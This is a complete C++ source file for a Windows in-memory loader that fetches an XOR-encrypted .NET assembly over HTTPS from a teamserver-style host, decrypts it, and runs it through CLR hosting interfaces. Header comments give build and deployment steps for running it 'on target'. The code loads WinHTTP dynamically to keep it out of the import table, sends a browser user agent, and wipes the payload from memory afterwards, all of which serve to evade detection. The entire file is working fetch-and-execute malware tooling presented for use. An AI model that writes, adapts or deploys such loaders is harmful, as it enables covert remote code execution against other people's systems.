// loader_https.cpp — Fetch assembly over HTTPS using WinHTTP, execute from memory
//
// Workflow:
//   1. Host your encrypted assembly on a web server (S3, CDN, teamserver, etc.)
//   2. Set the URL, XOR key, and args below
//   3. Cross-compile:  x86_64-w64-mingw32-g++ -O2 -municode -static-libgcc -static-libstdc++ \
//                        -o fetcher.exe loader_https.cpp -loleaut32 -lole32 -lwinhttp
//   4. Run on target — fetches, decrypts, executes, wipes from memory
//
// Uses WinHTTP (winhttp.dll) which is present on all Windows versions.
// Loaded dynamically to avoid import table entries.

#define WIN32_LEAN_AND_MEAN
#define COBJMACROS
#include <windows.h>
#include <objbase.h>
#include <oaidl.h>
#include <oleauto.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifndef _HDOMAINENUM_DEFINED
typedef void* HDOMAINENUM;
#define _HDOMAINENUM_DEFINED
#endif

// === COM GUIDs ===
static const GUID CLSID_CLRMetaHost =
    {0x9280188d, 0x0e8e, 0x4867, {0xb3, 0x0c, 0x7f, 0xa8, 0x38, 0x84, 0xe8, 0xde}};
static const GUID IID_ICLRMetaHost =
    {0xD332DB9E, 0xB9B3, 0x4125, {0x82, 0x07, 0xA1, 0x48, 0x84, 0xF5, 0x32, 0x16}};
static const GUID IID_ICLRRuntimeInfo =
    {0xBD39D1D2, 0xBA2F, 0x486a, {0x89, 0xB0, 0xB4, 0xB0, 0xCB, 0x46, 0x68, 0x91}};
static const GUID CLSID_CorRuntimeHost =
    {0xcb2f6723, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};
static const GUID IID_ICorRuntimeHost =
    {0xcb2f6722, 0xab3a, 0x11d2, {0x9c, 0x40, 0x00, 0xc0, 0x4f, 0xa3, 0x0a, 0x3e}};

// === COM Interface Declarations (same as mingw_loader.cpp) ===
#undef INTERFACE
#define INTERFACE ICLRMetaHost
DECLARE_INTERFACE_(ICLRMetaHost, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(GetRuntime)(THIS_ LPCWSTR pwzVersion, REFIID riid, LPVOID* ppRuntime) PURE;
    STDMETHOD(GetVersionFromFile)(THIS_ LPCWSTR, LPWSTR, DWORD*) PURE;
    STDMETHOD(EnumerateInstalledRuntimes)(THIS_ void**) PURE;
    STDMETHOD(EnumerateLoadedRuntimes)(THIS_ HANDLE, void**) PURE;
    STDMETHOD(RequestRuntimeLoadedNotification)(THIS_ void*) PURE;
    STDMETHOD(QueryLegacyV2RuntimeBinding)(THIS_ REFIID, LPVOID*) PURE;
    STDMETHOD(ExitProcess)(THIS_ INT32) PURE;
};
#undef INTERFACE
#define INTERFACE ICLRRuntimeInfo
DECLARE_INTERFACE_(ICLRRuntimeInfo, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(GetVersionString)(THIS_ LPWSTR, DWORD*) PURE;
    STDMETHOD(GetRuntimeDirectory)(THIS_ LPWSTR, DWORD*) PURE;
    STDMETHOD(IsLoaded)(THIS_ HANDLE, BOOL*) PURE;
    STDMETHOD(LoadErrorString)(THIS_ UINT, LPWSTR, DWORD*, LONG) PURE;
    STDMETHOD(LoadLibrary)(THIS_ LPCWSTR, HMODULE*) PURE;
    STDMETHOD(GetProcAddress)(THIS_ LPCSTR, LPVOID*) PURE;
    STDMETHOD(GetInterface)(THIS_ REFCLSID rclsid, REFIID riid, LPVOID* ppUnk) PURE;
    STDMETHOD(IsLoadable)(THIS_ BOOL* pbLoadable) PURE;
    STDMETHOD(SetDefaultStartupFlags)(THIS_ DWORD, LPCWSTR) PURE;
    STDMETHOD(GetDefaultStartupFlags)(THIS_ DWORD*, LPWSTR, DWORD*) PURE;
    STDMETHOD(BindAsLegacyV2Runtime)(THIS) PURE;
    STDMETHOD(IsStarted)(THIS_ BOOL*, DWORD*) PURE;
};
#undef INTERFACE
#define INTERFACE ICorRuntimeHost
DECLARE_INTERFACE_(ICorRuntimeHost, IUnknown) {
    STDMETHOD(QueryInterface)(THIS_ REFIID riid, void** ppv) PURE;
    STDMETHOD_(ULONG, AddRef)(THIS) PURE;
    STDMETHOD_(ULONG, Release)(THIS) PURE;
    STDMETHOD(CreateLogicalThreadState)(THIS) PURE;
    STDMETHOD(DeleteLogicalThreadState)(THIS) PURE;
    STDMETHOD(SwitchInLogicalThreadState)(THIS_ DWORD*) PURE;
    STDMETHOD(SwitchOutLogicalThreadState)(THIS_ DWORD**) PURE;
    STDMETHOD(LocksHeldByLogicalThread)(THIS_ DWORD*) PURE;
    STDMETHOD(MapFile)(THIS_ HANDLE, HMODULE*) PURE;
    STDMETHOD(GetConfiguration)(THIS_ void**) PURE;
    STDMETHOD(Start)(THIS) PURE;
    STDMETHOD(Stop)(THIS) PURE;
    STDMETHOD(CreateDomain)(THIS_ LPCWSTR, IUnknown*, IUnknown**) PURE;
    STDMETHOD(GetDefaultDomain)(THIS_ IUnknown**) PURE;
    STDMETHOD(EnumDomains)(THIS_ HDOMAINENUM*) PURE;
    STDMETHOD(NextDomain)(THIS_ HDOMAINENUM, IUnknown**) PURE;
    STDMETHOD(CloseEnum)(THIS_ HDOMAINENUM) PURE;
    STDMETHOD(CreateDomainEx)(THIS_ LPCWSTR, IUnknown*, IUnknown*, IUnknown**) PURE;
    STDMETHOD(CreateDomainSetup)(THIS_ IUnknown**) PURE;
    STDMETHOD(CreateEvidence)(THIS_ IUnknown**) PURE;
    STDMETHOD(UnloadDomain)(THIS_ IUnknown*) PURE;
    STDMETHOD(CurrentDomain)(THIS_ IUnknown**) PURE;
};
#undef INTERFACE

typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID, REFIID, LPVOID*);

static HRESULT DispatchCall(IDispatch* d, LPCOLESTR name, WORD flags, DISPPARAMS* p, VARIANT* r) {
    DISPID id;
    OLECHAR* n[] = { (OLECHAR*)name };
    HRESULT hr = d->GetIDsOfNames(IID_NULL, n, 1, LOCALE_SYSTEM_DEFAULT, &id);
    if (FAILED(hr)) return hr;
    return d->Invoke(id, IID_NULL, LOCALE_SYSTEM_DEFAULT, flags, p, r, NULL, NULL);
}

static void XorDecrypt(unsigned char* data, unsigned int len,
                       const unsigned char* key, unsigned int keyLen) {
    for (unsigned int i = 0; i < len; i++)
        data[i] ^= key[i % keyLen];
}

// ============================================================================
//  WinHTTP download — dynamically loaded, no import table entry
// ============================================================================

// WinHTTP types and constants (so we don't need winhttp.h)
typedef LPVOID HINTERNET;
#define WINHTTP_ACCESS_TYPE_DEFAULT_PROXY 0
#define WINHTTP_NO_PROXY_NAME NULL
#define WINHTTP_NO_PROXY_BYPASS NULL
#define WINHTTP_NO_REFERER NULL
#define WINHTTP_DEFAULT_ACCEPT_TYPES NULL
#define WINHTTP_NO_ADDITIONAL_HEADERS NULL
#define WINHTTP_NO_REQUEST_DATA NULL
#define WINHTTP_FLAG_SECURE 0x00800000
#define WINHTTP_QUERY_CONTENT_LENGTH 5
#define WINHTTP_QUERY_FLAG_NUMBER 0x20000000
#define INTERNET_DEFAULT_HTTPS_PORT 443

typedef HINTERNET (WINAPI *pWinHttpOpen)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET (WINAPI *pWinHttpConnect)(HINTERNET, LPCWSTR, WORD, DWORD);
typedef HINTERNET (WINAPI *pWinHttpOpenRequest)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD);
typedef BOOL (WINAPI *pWinHttpSendRequest)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD, DWORD, DWORD_PTR);
typedef BOOL (WINAPI *pWinHttpReceiveResponse)(HINTERNET, LPVOID);
typedef BOOL (WINAPI *pWinHttpQueryDataAvailable)(HINTERNET, LPDWORD);
typedef BOOL (WINAPI *pWinHttpReadData)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI *pWinHttpCloseHandle)(HINTERNET);
typedef BOOL (WINAPI *pWinHttpQueryHeaders)(HINTERNET, DWORD, LPCWSTR, LPVOID, LPDWORD, LPDWORD);

static unsigned char* HttpsDownload(LPCWSTR host, WORD port, LPCWSTR path,
                                     LPCWSTR userAgent, unsigned int* outLen) {
    *outLen = 0;

    HMODULE hWinHttp = LoadLibraryW(L"winhttp.dll");
    if (!hWinHttp) return NULL;

    pWinHttpOpen fnOpen = (pWinHttpOpen)GetProcAddress(hWinHttp, "WinHttpOpen");
    pWinHttpConnect fnConnect = (pWinHttpConnect)GetProcAddress(hWinHttp, "WinHttpConnect");
    pWinHttpOpenRequest fnOpenReq = (pWinHttpOpenRequest)GetProcAddress(hWinHttp, "WinHttpOpenRequest");
    pWinHttpSendRequest fnSendReq = (pWinHttpSendRequest)GetProcAddress(hWinHttp, "WinHttpSendRequest");
    pWinHttpReceiveResponse fnRecvResp = (pWinHttpReceiveResponse)GetProcAddress(hWinHttp, "WinHttpReceiveResponse");
    pWinHttpQueryDataAvailable fnQueryData = (pWinHttpQueryDataAvailable)GetProcAddress(hWinHttp, "WinHttpQueryDataAvailable");
    pWinHttpReadData fnReadData = (pWinHttpReadData)GetProcAddress(hWinHttp, "WinHttpReadData");
    pWinHttpCloseHandle fnClose = (pWinHttpCloseHandle)GetProcAddress(hWinHttp, "WinHttpCloseHandle");

    if (!fnOpen || !fnConnect || !fnOpenReq || !fnSendReq || !fnRecvResp || !fnReadData || !fnClose)
        return NULL;

    HINTERNET hSession = fnOpen(userAgent, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) return NULL;

    HINTERNET hConnect = fnConnect(hSession, host, port, 0);
    if (!hConnect) { fnClose(hSession); return NULL; }

    HINTERNET hRequest = fnOpenReq(hConnect, L"GET", path, NULL,
                                    WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                    WINHTTP_FLAG_SECURE);
    if (!hRequest) { fnClose(hConnect); fnClose(hSession); return NULL; }

    if (!fnSendReq(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                   WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
        fnClose(hRequest); fnClose(hConnect); fnClose(hSession);
        return NULL;
    }

    if (!fnRecvResp(hRequest, NULL)) {
        fnClose(hRequest); fnClose(hConnect); fnClose(hSession);
        return NULL;
    }

    // Read response body into a growing buffer
    unsigned int capacity = 65536;
    unsigned int total = 0;
    unsigned char* buffer = (unsigned char*)VirtualAlloc(NULL, capacity,
                                                         MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        fnClose(hRequest); fnClose(hConnect); fnClose(hSession);
        return NULL;
    }

    DWORD available = 0;
    while (fnQueryData(hRequest, &available) && available > 0) {
        if (total + available > capacity) {
            unsigned int newCap = capacity * 2;
            while (newCap < total + available) newCap *= 2;
            unsigned char* newBuf = (unsigned char*)VirtualAlloc(NULL, newCap,
                                                                  MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (!newBuf) break;
            memcpy(newBuf, buffer, total);
            SecureZeroMemory(buffer, total);
            VirtualFree(buffer, 0, MEM_RELEASE);
            buffer = newBuf;
            capacity = newCap;
        }

        DWORD bytesRead = 0;
        fnReadData(hRequest, buffer + total, available, &bytesRead);
        total += bytesRead;
    }

    fnClose(hRequest);
    fnClose(hConnect);
    fnClose(hSession);

    *outLen = total;
    return buffer;
}

// ============================================================================
//  CONFIGURATION — set these before compiling
// ============================================================================

// Where to fetch the encrypted assembly
static LPCWSTR downloadHost = L"your-teamserver.example.com";
static WORD    downloadPort = 443;
static LPCWSTR downloadPath = L"/payload.bin";
static LPCWSTR httpUserAgent = L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36";

// XOR key (must match what encrypt_payload.py used)
static unsigned char xorKey[] = {
    // PASTE YOUR KEY HERE
    0x41, 0x42, 0x43, 0x44  // placeholder
};
static unsigned int xorKeyLen = sizeof(xorKey);

// Args for the assembly's Main()
static LPCWSTR assemblyArgs[] = { NULL };
static int assemblyArgCount = 0;

// ============================================================================
//  CLR execution (same core as other loaders)
// ============================================================================

static int ExecuteAssembly(unsigned char* bytes, unsigned int len,
                           int argc, LPCWSTR* argv) {
    HRESULT hr;
    int result = 1;
    ICLRMetaHost* pMetaHost = NULL;
    ICLRRuntimeInfo* pRuntimeInfo = NULL;
    ICorRuntimeHost* pRuntimeHost = NULL;
    IUnknown* pDomainThunk = NULL;
    IDispatch* pDomainDisp = NULL;
    BOOL started = FALSE;

    CoInitializeEx(NULL, COINIT_MULTITHREADED);

    HMODULE hMscoree = LoadLibraryW(L"mscoree.dll");
    if (!hMscoree) goto cleanup;
    pfnCLRCreateInstance fnCreate = (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
    if (!fnCreate) goto cleanup;

    hr = fnCreate(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
    if (FAILED(hr)) goto cleanup;
    hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
    if (FAILED(hr)) goto cleanup;
    BOOL loadable = FALSE;
    pRuntimeInfo->IsLoadable(&loadable);
    if (!loadable) goto cleanup;
    hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);
    if (FAILED(hr)) goto cleanup;
    hr = pRuntimeHost->Start();
    if (FAILED(hr)) goto cleanup;
    started = TRUE;
    hr = pRuntimeHost->CreateDomain(L"Loader", NULL, &pDomainThunk);
    if (FAILED(hr)) goto cleanup;
    hr = pDomainThunk->QueryInterface(IID_IDispatch, (void**)&pDomainDisp);
    if (FAILED(hr)) goto cleanup;

    {
        SAFEARRAYBOUND bounds = { len, 0 };
        SAFEARRAY* psa = SafeArrayCreate(VT_UI1, 1, &bounds);
        void* pvData = NULL;
        SafeArrayAccessData(psa, &pvData);
        memcpy(pvData, bytes, len);
        SafeArrayUnaccessData(psa);

        VARIANT vtArg;
        VariantInit(&vtArg);
        vtArg.vt = VT_ARRAY | VT_UI1;
        vtArg.parray = psa;
        DISPPARAMS lp = { &vtArg, NULL, 1, 0 };
        VARIANT vtAsm;
        VariantInit(&vtAsm);
        hr = DispatchCall(pDomainDisp, L"Load", DISPATCH_METHOD, &lp, &vtAsm);
        SafeArrayDestroy(psa);
        if (FAILED(hr)) goto cleanup;

        IDispatch* pAsm = vtAsm.pdispVal;
        DISPPARAMS np = { NULL, NULL, 0, 0 };
        VARIANT vtEP;
        VariantInit(&vtEP);
        hr = DispatchCall(pAsm, L"EntryPoint", DISPATCH_PROPERTYGET, &np, &vtEP);
        if (FAILED(hr) || !vtEP.pdispVal) { pAsm->Release(); goto cleanup; }

        IDispatch* pMethod = vtEP.pdispVal;
        VARIANT vtArgs;
        VariantInit(&vtArgs);
        if (argc > 0 && argv) {
            SAFEARRAYBOUND ab = { (ULONG)argc, 0 };
            SAFEARRAY* sa = SafeArrayCreate(VT_BSTR, 1, &ab);
            for (int i = 0; i < argc; i++) {
                long idx = i;
                BSTR b = SysAllocString(argv[i]);
                SafeArrayPutElement(sa, &idx, b);
                SysFreeString(b);
            }
            vtArgs.vt = VT_ARRAY | VT_BSTR;
            vtArgs.parray = sa;
        }

        SAFEARRAYBOUND pb = { 1, 0 };
        SAFEARRAY* psaP = SafeArrayCreate(VT_VARIANT, 1, &pb);
        long idx = 0;
        SafeArrayPutElement(psaP, &idx, &vtArgs);
        VARIANT ia[2];
        VariantInit(&ia[0]);
        ia[0].vt = VT_ARRAY | VT_VARIANT;
        ia[0].parray = psaP;
        VariantInit(&ia[1]);
        DISPPARAMS ip = { ia, NULL, 2, 0 };
        VARIANT vtR;
        VariantInit(&vtR);
        hr = DispatchCall(pMethod, L"Invoke", DISPATCH_METHOD, &ip, &vtR);
        result = SUCCEEDED(hr) ? 0 : 1;

        VariantClear(&vtR);
        SafeArrayDestroy(psaP);
        if (vtArgs.vt != VT_EMPTY) VariantClear(&vtArgs);
        pMethod->Release();
        pAsm->Release();
    }

cleanup:
    if (pDomainDisp) pDomainDisp->Release();
    if (pDomainThunk && pRuntimeHost) pRuntimeHost->UnloadDomain(pDomainThunk);
    if (pDomainThunk) pDomainThunk->Release();
    if (pRuntimeHost) { if (started) pRuntimeHost->Stop(); pRuntimeHost->Release(); }
    if (pRuntimeInfo) pRuntimeInfo->Release();
    if (pMetaHost) pMetaHost->Release();
    CoUninitialize();
    return result;
}

// ============================================================================
int wmain(int argc, wchar_t* argv[]) {
    (void)argc; (void)argv;

    unsigned int payloadLen = 0;
    unsigned char* payload = HttpsDownload(downloadHost, downloadPort, downloadPath,
                                            httpUserAgent, &payloadLen);
    if (!payload || payloadLen == 0) {
        return 1;
    }

    XorDecrypt(payload, payloadLen, xorKey, xorKeyLen);

    int ret = ExecuteAssembly(payload, payloadLen, assemblyArgCount, assemblyArgs);

    SecureZeroMemory(payload, payloadLen);
    VirtualFree(payload, 0, MEM_RELEASE);
    return ret;
}
